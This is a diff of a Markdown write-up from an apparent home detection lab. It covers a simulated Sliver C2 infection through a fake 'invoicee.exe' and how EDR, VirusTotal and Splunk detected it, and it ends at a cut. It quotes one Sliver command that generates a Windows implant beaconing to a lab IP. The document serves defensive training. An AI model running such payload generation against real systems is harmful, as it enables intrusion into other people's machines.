@@ -37,6 +37,14 @@ A malicious Windows payload named **`invoicee.exe`** was delivered to a victim w
 generate --http 192.168.1.101:80 --save /opt/invoicee.exe --os windows
 ```
 
+📸 **Screenshot Placement**
+```md
+![Sliver payload generation command](screenshots/phase-1/sliver-payload-generation.png)
+```
+*Shows Sliver C2 payload creation and command execution.*
+
+---
+
 A malicious payload named **`invoicee.exe`** was generated and saved to `/opt/invoicee.exe`.
 
 The filename was intentionally chosen to appear legitimate and familiar, increasing the likelihood of successful user execution through **social engineering**.
@@ -44,9 +52,23 @@ The filename was intentionally chosen to appear legitimate and familiar, increas
 ### Delivery Method
 - Manual drag-and-drop into the victim’s **Downloads** folder
 
+📸 **Screenshot Placement**
+```md
+![Malicious file in Downloads folder](screenshots/phase-1/malware-in-downloads.png)
+```
+*Shows invoicee.exe placed in the user Downloads directory.*
+
+---
+
 ### Execution
 - User manually double-clicked the file
 - No exploitation or lateral movement was used
+
+📸 **Screenshot Placement**
+```md
+![User executing invoicee.exe](screenshots/phase-1/user-execution.png)
+```
+*Demonstrates manual execution by the user.*
 
 ---
 
@@ -63,12 +85,26 @@ LimaCharlie EDR generated alerts indicating suspicious activity on the host:
 - Execution path within the **Downloads** directory
 - YARA detections in memory
 
+📸 **Screenshot Placement**
+```md
+![LimaCharlie alert - suspicious execution](screenshots/phase-1/limacharlie-execution-alert.png)
+```
+*EDR alert showing suspicious process execution.*
+
+---
+
 The process tree shows:
 
 - **Parent Process:** `explorer.exe`
 - **Child Process:** `invoicee.exe`
 
-This strongly indicates **manual user execution**, rather than execution via service-based lateral movement (e.g., `services.exe`, `wmiprvse.exe`).
+📸 **Screenshot Placement**
+```md
+![Process tree showing explorer.exe spawning invoicee.exe](screenshots/phase-1/process-tree.png)
+```
+*Confirms manual user execution.*
+
+---
 
 #### Evidence Collected
 - **File Path:**  
@@ -84,6 +120,14 @@ This strongly indicates **manual user execution**, rather than execution via ser
 
 The SOC analyst extracted the SHA256 hash from LimaCharlie telemetry and performed reputation analysis.
 
+📸 **Screenshot Placement**
+```md
+![File hash from EDR telemetry](screenshots/phase-1/file-hash-extraction.png)
+```
+*Shows hash extraction from LimaCharlie.*
+
+---
+
 #### Artifacts
 - **File Path:**  
   ```
@@ -95,9 +139,19 @@ The SOC analyst extracted the SHA256 hash from LimaCharlie telemetry and perform
   ```
 - **Signer:** Unsigned / Unknown Publisher
 
+---
+
 #### Initial VirusTotal Check
 - **Result:** 0 detections
 - **Assessment:** No existing global reputation
+
+📸 **Screenshot Placement**
+```md
+![VirusTotal zero detection result](screenshots/phase-1/virustotal-zero-detection.png)
+```
+*Initial VT scan showing no detections.*
+
+---
 
 **Analyst Assessment:**  
 A zero-detection binary appearing in the user Downloads directory is classified as **highly suspicious** and indicative of:
@@ -105,16 +159,22 @@ A zero-detection binary appearing in the user Downloads directory is classified 
 - Targeted payload
 - Polymorphic or new dropper
 
+---
+
 #### Secondary VirusTotal Submission
 
 The binary was manually uploaded to VirusTotal for deeper inspection.
 
 - **Result:** CRITICAL  
 - **Detection Rate:** 58 / 70 vendors
-- **Classifications:**
-  - Trojan.Generic
-  - Malware.Heuristic
-  - EICAR-Test-Signature
+
+📸 **Screenshot Placement**
+```md
+![VirusTotal high detection result](screenshots/phase-1/virustotal-high-detection.png)
+```
+*Post-submission VT results confirming malware.*
+
+---
 
 **Analyst Conclusion:**  
 The file is confirmed malicious with high confidence.
@@ -134,11 +194,27 @@ Immediately after execution, the process initiated outbound network communicatio
 
 - **Destination IP:** `192.168.1.101`
 - **Port:** `80 (HTTP)`
-- **Pattern:** Repeated outbound connections (beaconing)
+- **Pattern:** Repeated outbound connections (Beaconing)
+
+📸 **Screenshot Placement**
+```md
+![Outbound C2 beaconing traffic](screenshots/phase-1/c2-beaconing.png)
+```
+*Network telemetry showing C2 communication.*
+
+---
 
 This activity was observed through:
 - LimaCharlie EDR network telemetry
 - Splunk correlation logs
+
+📸 **Screenshot Placement**
+```md
+![Splunk logs showing beaconing correlation](screenshots/phase-1/splunk-beaconing-correlation.png)
+```
+*SIEM correlation confirming C2 activity.*
+
+---
 
 #### Analyst Assessment
 
@@ -156,6 +232,14 @@ The following Detection & Response logic triggers on:
 - Executed from user-writable directories
 - Establishing outbound internet connections
 
+📸 **Screenshot Placement**
+```md
+![LimaCharlie detection rule](screenshots/phase-1/edr-detection-rule.png)
+```
+*EDR rule logic used for detection.*
+
+---
+
 *(Rule logic intentionally omitted for brevity / OPSEC)*
 
 ---
@@ -170,25 +254,9 @@ The infected host was deliberately left active to observe:
 - Phase 2 — Privilege Escalation
 - Phase 3 — Persistence mechanisms
 
+---
+
 ### Real-World Scenario
 
 In a production environment:
-- The endpoint would be **immediately isolated**
-- Network communication would be blocked
-- Memory and disk artifacts preserved for forensics
-
-This phase demonstrates the importance of:
-- User-executed malware detection
-- Correlating endpoint and network telemetry
-- Recognizing zero-reputation binaries as high-risk indicators
-
----
-
-## Phase Outcome
-
-✅ Initial access detected  
-✅ Malicious execution confirmed  
-✅ C2 beacon identified  
-✅ Indicators extracted for future detection  
-
-**Next Phase:** Privilege Escalation
+- The endpoint w
